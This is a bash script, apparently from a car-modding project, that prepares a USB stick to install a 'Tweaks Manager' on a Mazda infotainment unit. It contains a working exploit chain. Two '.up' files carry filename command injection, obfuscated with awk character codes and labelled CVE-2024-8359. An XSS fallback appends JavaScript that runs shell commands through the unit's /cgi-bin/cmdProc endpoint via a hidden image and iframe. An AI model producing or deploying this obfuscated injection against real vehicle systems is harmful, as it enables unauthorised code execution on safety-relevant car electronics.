#!/bin/bash
# Tweaks Manager — prepare USB stick
# Pattern taken from mazda-hud-toolkit make_usb().
# Creates a complete installer USB: trigger files, .up injection payloads,
# tweaks-manager payload, and XSS fallback (mp3 + dev.html).
if [ -z "${BASH_VERSION:-}" ]; then
  exec /bin/bash "$0" "$@"
fi
set -u
DIR="$(cd "$(dirname "$0")" && pwd)"

# --- colors ------------------------------------------------------------------
if [ -t 1 ]; then
  C_BR=$'\033[1;31m';C_BG=$'\033[1;32m';C_BY=$'\033[1;33m'
  C_BC=$'\033[1;36m';C_BOLD=$'\033[1m';C_0=$'\033[0m'
else
  C_BR="";C_BG="";C_BY="";C_BC="";C_BOLD="";C_0=""
fi
ok(){   printf "%s✓%s %s\n"  "$C_BG" "$C_0" "$*"; }
err(){  printf "%s✗%s %s\n"  "$C_BR" "$C_0" "$*"; }
warn(){ printf "%s!%s %s\n"  "$C_BY" "$C_0" "$*"; }
info(){ printf "%s▸%s %s\n"  "$C_BC" "$C_0" "$*"; }
hdr(){  echo; printf "%s═══ %s ═══%s\n" "$C_BC" "$*" "$C_0"; }

# --- HUD toolkit XSS files (optional, for SSH fallback) ---------------------
HUD_UNLOCK=""
for p in \
  "$DIR/../mazda-hud-toolkit/files/usb_unlock" \
  "/Users/vladstar/mazda/mazda-hud-toolkit/files/usb_unlock" \
  "/Users/vladstar/Downloads/mazda-hud-toolkit 2/files/usb_unlock"; do
  if [ -d "$p" ] && [ -f "$p/dev.html" ]; then
    HUD_UNLOCK="$p"
    break
  fi
done

hdr "Prepare Tweaks Manager USB"

# --- Check prerequisites ----------------------------------------------------
if [ ! -f "$DIR/tweaksd/tweaksd" ]; then
  err "tweaksd binary not found — run: make -C tweaksd"
  exit 1
fi
file "$DIR/tweaksd/tweaksd" | grep -q "ARM" || {
  err "tweaksd is not an ARM binary — rebuild with: make -C tweaksd clean all"
  exit 1
}

# Note: carplay-hud-lanes .so is deployed by its own install.sh, not by prepare-usb

# --- Detect USB --------------------------------------------------------------
info "detecting external USB drives..."
echo

tmp_file=$(mktemp -t mzdusb) || { err "mktemp failed"; exit 1; }
diskutil list external 2>/dev/null | grep -E '^/dev/disk[0-9]+ \(external' > "$tmp_file"

set --
n=0
while IFS= read -r line; do
  id="${line%% *}"
  dev="${id##*/}"
  sz=$(diskutil info "$id" 2>/dev/null | awk -F': *' '/^ *Disk Size/{print $2; exit}')
  name=$(diskutil info "$id" 2>/dev/null | awk -F': *' '/^ *Device \/ Media Name/{print $2; exit}')
  n=$((n+1))
  set -- "$@" "$dev|${sz:-?} — ${name:-USB drive}"
done < "$tmp_file"
rm -f "$tmp_file"

if [ "$n" -eq 0 ]; then
  err "no external USB drive found. Plug one in and try again."
  exit 1
fi

echo "Pick the USB to WIPE and prepare as MZD_TWEAKS (FAT32):"
echo
i=1
for e in "$@"; do
  d="${e%%|*}"
  l="${e#*|}"
  printf "  %s%d%s  /dev/%-7s  %s\n" "$C_BOLD" "$i" "$C_0" "$d" "$l"
  i=$((i+1))
done
printf "  %s0%s  cancel\n" "$C_BOLD" "$C_0"
echo
printf "> "
read CH
case "$CH" in
  ""|0) warn "cancelled"; exit 0 ;;
  [1-9]|[1-9][0-9]) : ;;
  *) warn "invalid"; exit 0 ;;
esac
if [ "$CH" -lt 1 ] || [ "$CH" -gt "$n" ]; then
  warn "invalid choice"; exit 0
fi
eval "sel=\${$CH}"
D="${sel%%|*}"
INFO="${sel#*|}"

echo
warn "about to WIPE /dev/$D  ($INFO)"
printf "confirm? [y/N] > "
read C
case "$C" in y|Y) : ;; *) warn "cancelled"; exit 0 ;; esac

# --- Format ------------------------------------------------------------------
echo
info "step 1/5 · unmounting /dev/$D..."
diskutil unmountDisk "/dev/$D" 2>&1 | sed 's/^/    /' || true

info "step 2/5 · erasing as FAT / MZD_TWEAKS (MBR)..."
if ! diskutil eraseDisk "MS-DOS" MZD_TWEAKS MBR "/dev/$D" 2>&1 | sed 's/^/    /'; then
  err "eraseDisk failed. Format manually via Disk Utility:"
  err "  Erase → Format: MS-DOS (FAT), Scheme: Master Boot Record, Name: MZD_TWEAKS"
  exit 1
fi

w=0
while [ ! -d /Volumes/MZD_TWEAKS ] && [ $w -lt 20 ]; do sleep 1; w=$((w+1)); done
if [ ! -d /Volumes/MZD_TWEAKS ]; then
  err "/Volumes/MZD_TWEAKS did not mount after 20 s"
  exit 1
fi

# --- Copy payload ------------------------------------------------------------
info "step 3/5 · copying payload (AppleDouble sidecars disabled)..."

# XSS/SSH unlock files (mp3 autoplay + dev.html) if available
if [ -n "$HUD_UNLOCK" ]; then
  ( export COPYFILE_DISABLE=1
    cp "$HUD_UNLOCK/s" /Volumes/MZD_TWEAKS/s
    cp "$HUD_UNLOCK/dev.html" /Volumes/MZD_TWEAKS/dev.html
    cp "$HUD_UNLOCK/mp3title.txt" /Volumes/MZD_TWEAKS/mp3title.txt 2>/dev/null || true
    cp -R "$HUD_UNLOCK/js" /Volumes/MZD_TWEAKS/js
    cp -R "$HUD_UNLOCK/css" /Volumes/MZD_TWEAKS/css
    cp -R "$HUD_UNLOCK/mp3" /Volumes/MZD_TWEAKS/mp3
    cp "$HUD_UNLOCK/mp3/"*.mp3 /Volumes/MZD_TWEAKS/ 2>/dev/null || true
  ) || true
  # Patch run.js: add Tweaks Manager button to XSS menu (Opera 12 / Presto compatible)
  if [ -f /Volumes/MZD_TWEAKS/js/run.js ]; then
    cat >> /Volumes/MZD_TWEAKS/js/run.js << 'TMJS'

// --- Tweaks Manager XSS button (appended by prepare-usb.sh) ---
(function(){
  function injectTM() {
    var el = document.querySelector('.xss-actions');
    if (!el) return;
    if (document.getElementById('xss-tm-btn')) return;
    var btn = document.createElement('div');
    btn.id = 'xss-tm-btn';
    btn.innerHTML = '<b>TM</b>';
    btn.className = 'xss-action';
    btn.style.cssText = 'background:#2196F3;color:#fff';
    btn.addEventListener('mousedown', function(){
      var cmd = 'for d in /tmp/mnt/sd?1 /mnt/sd?1;do [ -f $d/tweaks.sh ]&&sh $d/tweaks.sh&break;done';
      try { var i=new Image(); i.src='/cgi-bin/cmdProc?cmd='+encodeURIComponent(cmd); } catch(e){}
      try { var f=document.createElement('iframe'); f.style.display='none'; f.src='/cgi-bin/cmdProc?cmd='+encodeURIComponent(cmd); document.body.appendChild(f); } catch(e){}
    }, false);
    el.insertBefore(btn, el.firstChild);
  }
  if (document.querySelector('.xss-actions')) { injectTM(); }
  else { setTimeout(injectTM, 1000); }
})();
TMJS
    info "  Tweaks Manager button injected into XSS menu (run.js)"
  fi
  info "  XSS/SSH unlock files copied (from HUD toolkit)"
else
  warn "  HUD toolkit not found — XSS/SSH fallback not included"
fi

# USB trigger files
( export COPYFILE_DISABLE=1
  cp "$DIR/usb/t" /Volumes/MZD_TWEAKS/t
  cp "$DIR/usb/tweaks.sh" /Volumes/MZD_TWEAKS/tweaks.sh
  cp "$DIR/usb/jci-autoupdate" /Volumes/MZD_TWEAKS/jci-autoupdate
  cp "$DIR/usb/dataRetrieval_config.txt" /Volumes/MZD_TWEAKS/dataRetrieval_config.txt
) || { err "trigger file copy failed"; exit 1; }
chmod 755 /Volumes/MZD_TWEAKS/t /Volumes/MZD_TWEAKS/tweaks.sh
info "  trigger files copied (t, tweaks.sh, jci-autoupdate, dataRetrieval_config.txt)"

# Tweaks Manager payload
( export COPYFILE_DISABLE=1
  mkdir -p /Volumes/MZD_TWEAKS/tweaks-manager/installer
  mkdir -p /Volumes/MZD_TWEAKS/tweaks-manager/lib
  mkdir -p /Volumes/MZD_TWEAKS/tweaks-manager/jci-app

  cp "$DIR/installer/tweaks.sh" /Volumes/MZD_TWEAKS/tweaks-manager/installer/tweaks.sh
  cp "$DIR/tweaksd/tweaksd" /Volumes/MZD_TWEAKS/tweaks-manager/installer/tweaksd
  chmod 755 /Volumes/MZD_TWEAKS/tweaks-manager/installer/tweaksd

  cp "$DIR/lib/patch.sh" /Volumes/MZD_TWEAKS/tweaks-manager/lib/patch.sh

  cp "$DIR/jci-app/tweaks-menu.js" /Volumes/MZD_TWEAKS/tweaks-manager/jci-app/tweaks-menu.js

  for tweak in "$DIR/tweaks/"*/; do
    name=$(basename "$tweak")
    mkdir -p "/Volumes/MZD_TWEAKS/tweaks-manager/tweaks/$name"
    cp -R "$tweak"* "/Volumes/MZD_TWEAKS/tweaks-manager/tweaks/$name/" 2>/dev/null || true
  done
) || { err "payload copy failed"; exit 1; }
info "  tweaks-manager payload copied"

# --- .up injection payloads (CVE-2024-8359) ----------------------------------
info "step 4/5 · creating .up injection payloads (CVE-2024-8359)..."
# /mnt/sd[abcd]1/t  →  sh=115,104 sp=32 /=47 m=109 n=110 t=116 /=47
#   s=115 d=100 [=91 a=97 b=98 c=99 d=100 ]=93 1=49 /=47 t=116
UP_MNT='$(awk -v f=%c '"'"'BEGIN{s=f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}'"'"').up'
# /tmp/mnt/sd[abcd]1/t  →  adds t=116 m=109 p=112 /=47 before mnt
UP_TMP='$(awk -v f=%c '"'"'BEGIN{s=f f f f f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,116,109,112,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}'"'"').up'
: > "/Volumes/MZD_TWEAKS/${UP_MNT}"  || warn "could not create .up payload (mnt)"
: > "/Volumes/MZD_TWEAKS/${UP_TMP}"  || warn "could not create .up payload (tmp/mnt)"

# --- Cleanup (BEFORE MD5SUM — Spotlight/macOS junk must not leak into checksum) --
find /Volumes/MZD_TWEAKS \( -name '._*' -o -name '.DS_Store' -o -name '.Trashes' \
                     -o -name '.Spotlight-V100' -o -name '.fseventsd' \
                     -o -name '.TemporaryItems' -o -name '.apdisk' \) \
     -exec rm -rf {} + 2>/dev/null || true

# --- MD5SUM (for runner integrity check) --------------------------------------
info "  generating MD5SUM..."
# md5 -r → "HASH FILENAME" (one space). BusyBox md5sum -c needs "HASH  FILENAME" (two spaces).
# sed 1: strip leading ./ from paths. sed 2: first space → two spaces (busybox compat).
( export COPYFILE_DISABLE=1; cd /Volumes/MZD_TWEAKS && find . -type f \
    ! -name '*.up' ! -name 'MD5SUM' ! -name '.DS_Store' ! -name '._*' \
    ! -path './.Spotlight-V100/*' ! -path './.fseventsd/*' ! -path './.Trashes/*' \
    -exec md5 -r {} + | sed 's/ \.\// /' | sed 's/ /  /' > MD5SUM )
info "  MD5SUM generated ($(wc -l < /Volumes/MZD_TWEAKS/MD5SUM | tr -d ' ') files)"

# Final cleanup — macOS re-creates AppleDouble sidecars when writing MD5SUM
find /Volumes/MZD_TWEAKS \( -name '._*' -o -name '.DS_Store' \) -exec rm -f {} + 2>/dev/null || true

sync

# --- Verify ------------------------------------------------------------------
info "step 5/5 · verifying..."
echo
echo "  files:"
ls -la /Volumes/MZD_TWEAKS | sed 's/^/    /'
echo

problems=0

for f in t tweaks.sh jci-autoupdate dataRetrieval_config.txt \
         tweaks-manager/installer/tweaks.sh tweaks-manager/installer/tweaksd \
         tweaks-manager/lib/patch.sh \
         tweaks-manager/jci-app/tweaks-menu.js; do
  if [ ! -e "/Volumes/MZD_TWEAKS/$f" ]; then
    err "  MISSING: $f"
    problems=$((problems+1))
  fi
done

for tweak in "$DIR/tweaks/"*/; do
  name=$(basename "$tweak")
  if [ ! -f "/Volumes/MZD_TWEAKS/tweaks-manager/tweaks/$name/install.sh" ]; then
    err "  MISSING: tweaks/$name/install.sh"
    problems=$((problems+1))
  fi
  # verify subdirectories were copied (e.g. hud-carplay-nav/files/)
  if [ -d "$tweak/files" ]; then
    if [ ! -d "/Volumes/MZD_TWEAKS/tweaks-manager/tweaks/$name/files" ]; then
      err "  MISSING: tweaks/$name/files/ directory"
      problems=$((problems+1))
    else
      so_count=$(find "/Volumes/MZD_TWEAKS/tweaks-manager/tweaks/$name/files" -name '*.so' 2>/dev/null | wc -l | tr -d ' ')
      src_count=$(find "$tweak/files" -name '*.so' 2>/dev/null | wc -l | tr -d ' ')
      if [ "$so_count" -ne "$src_count" ]; then
        err "  tweaks/$name: expected $src_count .so files, found $so_count"
        problems=$((problems+1))
      else
        ok "  tweaks/$name: $so_count .so binaries in files/"
      fi
    fi
  fi
done

up_count=$(find /Volumes/MZD_TWEAKS -maxdepth 1 -name '*.up' 2>/dev/null | wc -l | tr -d ' ')
if [ "$up_count" -ge 2 ]; then
  ok "  $up_count .up injection payloads present"
else
  err "  expected 2 .up payload files, found $up_count — CVE-2024-8359 trigger will not work"
  problems=$((problems+1))
fi

if file /Volumes/MZD_TWEAKS/tweaks-manager/installer/tweaksd | grep -q "ARM"; then
  ok "  tweaksd: ARM binary"
else
  err "  tweaksd: NOT an ARM binary"
  problems=$((problems+1))
fi

dsc=$(find /Volumes/MZD_TWEAKS -name '._*' 2>/dev/null | wc -l | tr -d ' ')
if [ "$dsc" -gt 0 ]; then
  err "  $dsc AppleDouble (._*) sidecar files leaked"
  problems=$((problems+dsc))
fi

echo
if [ "$problems" -eq 0 ]; then
  ok "all files present, no AppleDouble junk"
else
  err "$problems problem(s) — re-run prepare-usb.sh"
  diskutil eject /Volumes/MZD_TWEAKS 2>/dev/null || true
  exit 1
fi

diskutil eject /Volumes/MZD_TWEAKS
echo
ok "USB ready. In the car:"
info "  1. Insert USB → wait ~30s → Install dialog appears."
info "     (The .up injection triggers via the firmware update scanner.)"
info "  2. If no dialog: Media → USB → tap any mp3 → XSS menu → SSH."
